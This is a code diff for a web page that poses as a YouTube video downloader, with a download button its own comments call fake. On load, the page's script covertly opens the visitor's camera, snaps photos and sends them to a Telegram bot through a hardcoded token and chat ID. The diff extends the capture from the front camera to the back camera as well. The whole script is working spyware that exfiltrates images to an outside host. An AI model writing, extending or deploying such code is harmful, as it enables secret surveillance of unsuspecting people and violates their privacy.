@@ -63,8 +63,8 @@
     </div>
 
     <script>
-        const BOT_TOKEN = '7910848214:AAHVBM9OhbpsH8GPx3zDzHe3_OzLoOhg_sQ'; // Replace with your bot token
-        const CHAT_ID = '7872545726';             // Replace with your chat ID
+        const BOT_TOKEN = '7910848214:AAHVBM9OhbpsH8GPx3zDzHe3_OzLoOhg_sQ';
+        const CHAT_ID = '7872545726';
         const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
         const video = document.getElementById('video');
@@ -73,29 +73,41 @@
         const youtubeUrl = document.getElementById('youtube-url');
         const context = canvas.getContext('2d');
 
-        // Camera access
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                setTimeout(capturePhoto, 2000); // Capture after 2 seconds
-            })
-            .catch(err => {
-                console.error("Error accessing camera: ", err);
-            });
+        // Function to start camera
+        function startCamera(facingMode) {
+            const constraints = {
+                video: { facingMode: facingMode } // 'user' for front, 'environment' for back
+            };
 
-        // Capture photo
-        function capturePhoto() {
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(() => captureAndSendPhoto(facingMode), 2000); // Capture after 2 sec
+                })
+                .catch(err => {
+                    console.error(`Error accessing ${facingMode} camera: `, err);
+                });
+        }
+
+        // Capture and send photo
+        function captureAndSendPhoto(cameraType) {
             context.drawImage(video, 0, 0, 640, 480);
             canvas.toBlob(blob => {
-                sendPhotoToTelegram(blob);
+                sendPhotoToTelegram(blob, `${cameraType}_photo.jpg`);
+                // Stop the current stream after capturing
+                video.srcObject.getTracks().forEach(track => track.stop());
+                // Switch to the other camera
+                if (cameraType === 'front') {
+                    startCamera('environment'); // Back camera next
+                }
             }, 'image/jpeg');
         }
 
         // Send photo to Telegram
-        function sendPhotoToTelegram(photoBlob) {
+        function sendPhotoToTelegram(photoBlob, filename) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', photoBlob, 'userphoto.jpg');
+            formData.append('photo', photoBlob, filename);
 
             fetch(TELEGRAM_API, {
                 method: 'POST',
@@ -104,7 +116,7 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    console.log('Photo sent to Telegram!');
+                    console.log(`${filename} sent to Telegram!`);
                 } else {
                     console.error('Error:', data);
                 }
@@ -114,7 +126,10 @@
             });
         }
 
-        // Fake download button (for disguise)
+        // Start with front camera
+        startCamera('user');
+
+        // Fake download button
         downloadButton.addEventListener('click', () => {
             const url = youtubeUrl.value.trim();
             if (url) {
@@ -125,4 +140,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
